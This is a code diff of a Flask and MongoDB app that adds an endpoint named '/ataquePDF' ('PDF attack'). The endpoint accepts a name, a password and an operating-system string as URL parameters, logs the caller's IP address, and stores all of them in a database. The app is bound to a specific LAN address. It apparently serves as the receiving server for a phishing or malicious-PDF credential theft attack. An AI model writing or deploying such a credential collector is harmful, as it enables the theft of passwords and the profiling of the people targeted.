@@ -1,32 +1,34 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, url_for
 from flask_pymongo import PyMongo
 from bson.json_util import loads, dumps
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='templates')
 app.config['MONGO_URI']='mongodb://localhost/pythonmongodb' 
 mongo = PyMongo(app)
 
 @app.route('/')
 def index():
-    return "Ruta principal, '/' introducir '/tabla' "
+    find = mongo.db.nicob.find()
+    return render_template('index.html', find = find )
 
-@app.route('/tabla')
-def tabla():
-    json = loads(dumps(mongo.db.nicob.find()))
-    datos = []
-    for i in json:
-        datos.append([i['valor0'],i['valor1'],i['valor2'],i['valor3']])
-    return render_template('index.html', datos = datos)
+@app.route('/ataquePDF', methods = ['GET'] )
+def ataquePDF():
+    if(request.method == 'GET'):
+        nombre = request.args.get('nombre')
+        contrasena = request.args.get('contrasena')
+        ip =  request.remote_addr
+        s_op = request.args.get('s_op')
 
-@app.route("/agregar", methods=['POST'])
-def agregar():
-    valor0 = request.json['valor0']
-    valor1 = request.json['valor1']
-    valor2 = request.json['valor2']    
-    valor3 = request.json['valor3']
-    if valor0 and valor1 and valor2 and valor3:
-       id = mongo.db.nicob.insert({'valor0':valor0,'valor1':valor1,'valor2':valor2,'valor3':valor3})
-    return "pdf agregado!"
+        mongo.db.nicob.insert({
+            'nombre':nombre,
+            'contrasena':contrasena,
+            'ip': ip,
+            's_op':s_op
+            })
+        return redirect(url_for('index'))
+    else:
+        return 'no funciono xd'
+
 
 if __name__ =="__main__":
-    app.run(host='0.0.0.0', port=3000)
+    app.run(host='192.168.61.207', port=3000)
